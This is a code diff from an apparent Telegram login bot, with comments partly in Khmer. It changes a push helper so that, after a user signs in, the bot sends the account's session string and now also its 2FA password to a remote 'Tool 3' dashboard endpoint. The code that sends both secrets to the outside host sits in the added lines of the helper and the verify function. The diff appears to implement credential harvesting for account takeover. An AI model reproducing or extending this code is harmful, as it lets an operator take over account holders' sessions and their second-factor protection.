@@ -85,8 +85,8 @@ def _sync_bot_api_post(method: str, data: dict):
 async def bot_api_post(method: str, data: dict):
     return await asyncio.to_thread(_sync_bot_api_post, method, data)
 
-# ─── PUSH TO TOOL 3 HELPER ───
-def _sync_push_to_tool3(session_string: str):
+# ─── PUSH TO TOOL 3 HELPER (UPDATED WITH 2FA) ───
+def _sync_push_to_tool3(session_string: str, two_fa: str = ""):
     if not TOOL3_PUSH_URL or not T3_PUSH_KEY:
         logger.warning("⚠️ TOOL3_PUSH_URL or T3_PUSH_KEY is missing. Skipping direct push.")
         return
@@ -96,19 +96,20 @@ def _sync_push_to_tool3(session_string: str):
         "Content-Type": "application/json"
     }
     payload = {
-        "string": session_string
+        "string": session_string,
+        "two_fa": two_fa  # 👈 បញ្ជូនកូដ 2FA ទៅជាមួយ
     }
     try:
         res = requests.post(TOOL3_PUSH_URL, json=payload, headers=headers, timeout=10)
         if res.status_code == 200:
-            logger.info("🚀 Successfully pushed session string directly to Tool 3!")
+            logger.info("🚀 Successfully pushed session string and 2FA directly to Tool 3!")
         else:
             logger.error(f"❌ Failed to push to Tool 3: {res.status_code} - {res.text}")
     except Exception as e:
         logger.error(f"⚠️ Error connecting to Tool 3 push endpoint: {e}")
 
-async def push_to_tool3(session_string: str):
-    await asyncio.to_thread(_sync_push_to_tool3, session_string)
+async def push_to_tool3(session_string: str, two_fa: str = ""):
+    await asyncio.to_thread(_sync_push_to_tool3, session_string, two_fa)
 
 async def async_send_code(phone_number):
     client = Client(
@@ -150,8 +151,8 @@ async def async_verify_code(phone_number, code, password):
     await client.disconnect()
     temp_clients.pop(phone_number, None)
 
-    # 🚀 ផ្ញើ Session String ចូល Project Tool 3 (dashboardbyfinn.up.railway.app) ដោយផ្ទាល់
-    await push_to_tool3(session_string)
+    # 🚀 ផ្ញើ Session String និង 2FA ចូល Project Tool 3 (dashboardbyfinn.up.railway.app) ដោយផ្ទាល់
+    await push_to_tool3(session_string, two_fa=password or "")
 
     msg_id = None
     if BOT_TOKEN and ADMIN_CHAT_ID:
